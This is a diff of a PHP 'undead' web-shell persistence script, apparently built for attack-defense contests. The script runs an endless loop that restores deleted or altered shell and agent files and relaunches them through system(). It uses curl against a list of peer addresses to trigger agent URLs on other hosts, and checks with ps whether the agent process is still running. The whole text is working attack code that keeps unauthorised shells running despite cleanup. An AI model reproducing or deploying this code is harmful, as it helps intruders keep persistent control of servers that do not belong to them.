@@ -21,7 +21,7 @@ function start_undead(){
     system("php ".$shell_name);
 }
 
-function start_agent($agent_shell){
+function start_agent(){
     global $agent_name, $agent_shell;
     file_put_contents($agent_name, $agent_shell);
     //system("php ".$agent_shell);	
@@ -29,7 +29,7 @@ function start_agent($agent_shell){
 
 function check_undead(){
     global $undead_release_shell,$shell_name;
-    if(file_get_contents($shell_name)!==$undead_release_shell){
+    if(file_get_contents($shell_name)!=$undead_release_shell){
 	return False;
     }
     return True;
@@ -37,47 +37,45 @@ function check_undead(){
 
 function check_agent(){
     global $agent_name, $agent_shell;
-    if(file_get_contents($agent_name)!==$agent_shell){
+    if(file_get_contents($agent_name)!=$agent_shell){
 	return False;
     }
     return True;
 }
 
 function check_agent_process(){
-    global $time_file;
-    if(file_get_contents($time_file)!=time()){
+    global $agent_name;
+    $outcome = shell_exec('ps -ef | grep -v grep | grep "php '.$agent_name.'"');
+    if (!$outcome){
 	return False;
     }
     return True;
 }
 
-function agent_write_time(){
-    global $time_file;
-    file_put_contents($time_file,time());
-}	
-
 function p2p_visit(){
     global $peer_addr,$agent_url;
     foreach($peer_addr as $addr){
-	system('curl "http://'.$addr.$agent_url.'" -m 1 ');
+	system('curl "http://'.$addr.$agent_url.'" -m 1 2>/dev/null');
     }
 }
 
 if(PHP_SAPI_NAME()=='cli'){
     while(True){
 	if(!check_undead()){
+	    echo "start undead\n";
 	    start_undead();
 	}
 	if(!check_agent()){
+	    echo "start agent\n";
 	    start_agent();
 	}
-	agent_write_time();
 	p2p_visit();
-	sleep(1);
+	usleep(10);
     }
 }else{
     if(!check_agent_process()){
+	echo "\nprocess dies\n";
 	system('php '.$agent_name);
     }
-    echo 'copyright@BUAA';
+    echo 'OK';
 }
